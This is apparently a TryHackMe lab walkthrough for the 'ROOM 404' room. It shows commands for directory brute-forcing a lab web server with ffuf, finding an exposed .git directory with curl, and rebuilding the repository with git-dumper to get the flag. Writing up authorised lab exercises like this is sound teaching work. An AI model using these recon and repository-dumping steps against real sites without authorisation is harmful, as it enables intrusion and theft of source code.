<p align="center">
  <img src="https://tryhackme.com/_next/image?url=https%3A%2F%2Fcdn-images.tryhackme.com%2Froom-icons%2F5dbea226085ab6182a2ee0f7-1785087675274&w=96&q=75">
</p>

# ROOM 404

Here we have to find Byte Lotus Exposed Source Code. First, we need to identify the clues.
  1. He booked the quiet room. It's not on the floor plan.
  2. But port 8080 is wide open.
  3. First days as a guest who simply notices things: a room that isn't on the floor plan, packets that leave every night at the same hour.
  4. Night-shift developer shipped more than the website.

According to these clues, we need to launch **Directory brute-forcing (Content Delivery Attack)** to find the exposed code.

Target:

```
http://MACHINE_IP:8080
```

## STEP 01

- First, roam around the website and find what happened there.
- Open webrowser:
  ```
  http://MACHINE_IP:8080/
  ```
- Click the **reserve button**
- It returns **404 not found**

> **HINT** : The rooms it **never lists** are the ones worth finding. <br>
> - The hint tells us that there is a hidden path that is not linked anywhere on the website. This means the path exists on the web server, but users cannot reach it by clicking links on the website.<br>
> - You can inspect the website using **Developer Tools** to see if the route for the Reserve button is exposed in the client side code (HTML, JavaScript, or network requests). If the server never sends that information to the browser, you won't be able to find it from Developer Tools alone.

## STEP 02

- Use ```curl``` to identify the server technology by examining the **HTTP response** headers.
  ```bash
  curl -I http://MACHINE_IP:8080/
  ```
  > -I : The *-I* option in *curl* is used to retrieve only the HTTP response headers without downloading the webpage content.
- It returns output like this
  ```
  HTTP/1.1 200 OK
  Server: Werkzeug/3.0.1 Python/3.12.3
  ```
  > **HINT** : The night-shift developer shipped more than the website
  
  > - **200 OK** :  This status code indicates that the web server is active, the connection was successful, and the requested page or resource was delivered without errors. This is correct because we can access the Byte Lotus Hotel website through the link **http://MACHINE_IP:8080/**)
  
  > - **Server** : This shows information about the web server software and technology being used to handle the request. The Byte Lotus website is running on a Python Flask web application, and the web server technology identified is Werkzeug, which is the WSGI library used by Flask to handle HTTP requests.

  > - **Conclusion** : This is not a static website because it uses server-side processing and dynamic functionality. It is a web application.

## STEP 03

- Inspect the Website Source Code
  ```bash
  curl http://MACHINE_IP:8080/
  ```
  > This will fetch the homepage (index.html) source code.
- Then, in the source code, you can find anchor links.
  ```html
  <a href="/booking">Reserve a stay</a>
  ```
  > This is an important finding because it shows that the website has a route called /booking (http://MACHINE_IP:8080/booking). However, when we access it, the page returns "Not Found," which means the route may exist in the application code but the corresponding page or resource is not currently deployed or available on the server.

  > **HINT** : guest experience platform · build staging

  > **GUES** : The hint "build staging" means that a staging version of the application may be publicly accessible. This could be a development/testing environment that contains features or code that have not been deployed to the production website.

  > **Conclution** :
  > Developers often accidentally expose:
  > - source code
  > - backups
  > - Git repositories
  > - configuration files

## STEP 04

- Here, we need to use directory brute-forcing against the web application server.
- Before this, we need a wordlist to perform this.
- Check the wordlist
  ```bash
  ls /usr/share/wordlists/
  ```
- Output
  ```
  MetasploitRoom
  SecLists
  dirbuster
  rockyou.txt
  PythonForPentesters
  dirb
  fasttrack.txt
  wordlists
  ```
  - If you get an error response, it means that the directory from the wordlist does not exist on the attacker machine(you)
  - Use these two commands to install the wordlist called **seclist**
    ```
    sudo apt update
    sudo apt install seclists
    ```
    > This will update and download the **seclist** folder into the **wordlist**
- Now locate the *Web contetn worldlist* from seclist.
  ```bash
  ls /usr/share/wordlists/SecLists/Discovery/Web-Content/
  ```
  - Output
  ```
  common.txt
  directory-list-2.3-small.txt
  directory-list-2.3-medium.txt
  raft-small-files.txt
  raft-small-directories.txt
  ```
- Perform DPerform Directory Discovery
- We use *ffuf*
  > **ffuf ( Fuzz Faster U Fool)** is a tool that sends many requests to a web server using a wordlist and checks the responses to find hidden directories, files, parameters, or endpoints.

  ```bash
  ffuf -u http://MACHINE_IP:8080/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  -fc 404
  ```
  > ffuf: A web fuzzing tool used to discover hidden directories, files, and endpoints.

  > - **-u http://MACHINE_IP:8080/FUZZ** : Defines the target URL. The FUZZ keyword is replaced with each entry from the wordlist to test different paths on the server.
    ```
    /FUZZ
    ``` 
    becomes:
    ```
    /admin
    /backup
    /.git
    /source
    ```
  > - **-w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt** : Specifies the wordlist that contains common directory and file names. ffuf uses each word from this list to create requests.
  > - **-fc 404** : Filters out HTTP 404 Not Found responses, so ffuf does not display paths that do not exist.
  
  > Overall, this command checks the web server for hidden directories or files using a wordlist and shows only valid or interesting responses.

-  Discover the Exposed Git Repository
-  The scan returns
    ```
    .git/HEAD [Status: 200]
    ```
    > This is the important discovery.
    ```
    A `.git` directory contains:
      
      - Source code history
      - Commit information
      - Previous versions
      - Developer information
      - Deleted files
      
      The developer accidentally exposed the Git repository.
      ```
- Confirm .git Exposure
  ```bash
  curl http://MACHINE_IP:8080/.git/HEAD
  ```
  Output:
  ```
  ref: refs/heads/main
  ```
  > This confirms the repository exists.
- Find Git Commit History
  Check the Git log:
  ```bash
  curl http://10.130.176.140:8080/.git/logs/HEAD
  ```
  Output:
  ```
  0000000000000000000000000000000000000000 
  0f13550b4cb13e9f30c61d5b342c532d21e45bda 
  night-shift <dev@byte-lotus.internal>
  commit (initial): initial Byte Lotus guest platform
  ```
  > Important information:
      Commit hash:
      ```
      0f13550b4cb13e9f30c61d5b342c532d21e45bda
      ```
  > Extract information from the Git HEAD hash value.
    ```
    curl http://10.130.162.181:8080/.git/objects/0f/13550b4cb13e9f30c61d5b342c532d21e45bda
    ```
## Recovering an Exposed Git Repository Using git-dumper

The easiest way to recover an exposed Git repository is by using **git-dumper**.

`git-dumper` is a tool used to download an exposed `.git` directory from a web server and reconstruct the Git repository locally.

When a website accidentally exposes its `.git` directory, it may reveal:

- Source code
- Commit history
- Developer information
- Previous versions of files
- Configuration files
- Sometimes sensitive data that was removed from the current version but still exists in Git history

The general process is:

1. Identify that the `.git` directory is exposed.
2. Use `git-dumper` to retrieve the repository contents.
3. Analyze the recovered Git files and history.

The purpose of using `git-dumper` is to restore the repository structure so that the exposed Git data can be examined.

## FINALE STEP

Install:
```bash
pip install git-dumper
```

Check installation:
```bash
git-dumper --help
```

Dump the Git Repository
Run:
```bash
git-dumper http://10.130.176.140:8080/.git/ byte_lotus
```
Output:
```
[-] Fetching .git recursively
[-] Fetching .git/objects/
[-] Fetching .git/logs/
[-] Fetching .git/refs/
[-] Running git checkout .
Updated 3 paths from the index
```
> This means the repository has been recovered.

Move into the dumped folder:
```bash
cd byte_lotus
```
### Inside this folder you will find the **Flag** 🚩.

# Congratulations on Exploration


  
